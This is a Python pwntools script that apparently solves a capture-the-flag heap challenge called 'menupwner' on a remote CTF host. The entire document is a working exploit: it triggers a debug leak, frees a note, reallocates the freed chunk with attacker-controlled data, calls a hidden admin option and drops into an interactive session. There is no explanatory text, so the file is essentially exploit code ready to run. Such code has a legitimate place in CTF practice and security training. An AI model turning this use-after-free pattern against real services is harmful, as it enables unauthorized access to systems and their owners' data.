#!/usr/bin/env python3
from pwn import *

context.log_level = "info"

HOST = "menupwner.challenges2.ctf.dscjssstuniv.in"
PORT = 9999

def menu(p):
    p.recvuntil(b"Choice:")

def solve():
    p = remote(HOST, PORT)

    menu(p)

    # Add note
    p.sendline(b"1")
    p.recvuntil(b"Note size")
    p.sendline(b"40")
    p.recvuntil(b"Note content:")
    p.sendline(b"AAAA")
    menu(p)

    # Debug leak
    p.sendline(b"6")
    debug = p.recvuntil(b"Choice:")
    print(debug.decode(errors="ignore"))

    # Delete note
    p.sendline(b"3")
    p.recvuntil(b"Note index")
    p.sendline(b"0")
    menu(p)

    # Allocate again (reuse chunk)
    p.sendline(b"1")
    p.recvuntil(b"Note size")
    p.sendline(b"40")
    p.recvuntil(b"Note content:")
    p.sendline(b"CONTROLLED_DATA")
    menu(p)

    print("[+] Memory chunk successfully reused")

    # Try admin access
    p.sendline(b"7")
    out = p.recv(timeout=2)
    print(out.decode(errors="ignore"))

    p.interactive()

if __name__ == "__main__":
    solve()
